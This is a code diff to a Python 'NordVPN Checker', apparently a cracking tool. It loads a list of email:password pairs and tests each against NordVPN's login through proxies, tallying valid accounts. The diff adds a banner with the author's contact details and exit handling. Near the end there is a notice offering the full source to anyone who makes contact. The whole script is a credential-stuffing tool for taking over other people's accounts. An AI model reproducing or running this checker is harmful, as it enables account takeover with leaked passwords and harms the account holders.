@@ -1,7 +1,6 @@
-# <coded by @josifkhan>
-# WHATSAPP: +8801868608046
-# -----------------------------------------------
 import requests,sys,os
+from datetime import datetime
+from platform import uname
 # colors
 rd  = "\033[1;31m"
 yl  = "\033[1;33m"
@@ -10,10 +9,27 @@ en  = "\033[0m"
 ok  = [0]
 tts = [0]
 xa  = []
+line= "-"*60
 # ----------------------------------------------
 class NORDVPN:
 	def __init__(self):
-		os.system("cls")
+		if 'win' in str(uname()).lower():os.system("cls")
+		else:os.system("clear")
+		banner = f"""{rd}
+███╗   ██╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗██████╗ ███╗   ██╗
+████╗  ██║██╔═══██╗██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║
+██╔██╗ ██║██║   ██║██████╔╝██║  ██║██║   ██║██████╔╝██╔██╗ ██║
+██║╚██╗██║██║   ██║██╔══██╗██║  ██║╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║
+██║ ╚████║╚██████╔╝██║  ██║██████╔╝ ╚████╔╝ ██║     ██║ ╚████║
+╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝     ╚═╝  ╚═══╝
+ -------------------------------------------------------------
+[ Tools Name   : NordVPN Checker                              ]
+[ WhatsApp     : +8801868608046                               ]
+[ Version      : v3.0                                         ]
+[ Github       : github.com/josifkhang                        ]
+[ Time & Date  : {grn}{str(datetime.now())[0:26]}{rd}                   ]
+ -------------------------------------------------------------{en}"""
+		print(banner)
 	def login(selfy,user,password,proxy_url):
 		sys.stdout.write(f"\r⬛CHECKING]: {len(xa)}/{grn}{ok[0]}{en}/{tts[0]}")
 		with requests.Session() as session:
@@ -28,7 +44,7 @@ class NORDVPN:
 				return response.json()
 			except Exception as e:print("Error:", e);return {"message":"Error","status":"badd"}
 	def main(self):
-		with open(input(f"⬛{rd}Enter filename{en}: "),"r") as f:accounts=f.readlines();tts[0]=len(accounts)
+		with open(input(f"⬛{grn}Enter filename{en}: "),"r") as f:accounts=f.readlines();tts[0]=len(accounts)
 		print("-"*60)
 		for account in accounts:
 			user     = account.split(":")[0].strip()
@@ -48,8 +64,16 @@ email     = "user_email@josiftools.com"
 password  = "user_pass"
 proxy_url = "http://username:password@host:port" # http or socks5
 # -----------------------------------------------------------------------
-nd = NORDVPN()
-nd.main()
+try:
+	nd = NORDVPN()
+	nd.main()
+except KeyboardInterrupt:
+	print(f"\n⬛DONE]: {len(xa)}/{grn}{ok[0]}{en}/{tts[0]}")
+	input("+stopped by user / enter to exit")
+	sys.exit()
 # -----------------------------------------------------------------------
 # ✅NOTICE: THIS API HAS LIMIT, IF U R INTERESTED IN ACTUAL SOURCE CODE YOU CAN CONTACT ME.
-
+print(line)
+print(f"\n⬛DONE]: {len(xa)}/{grn}{ok[0]}{en}/{tts[0]}")
+input("enter to exit")
+sys.exit()
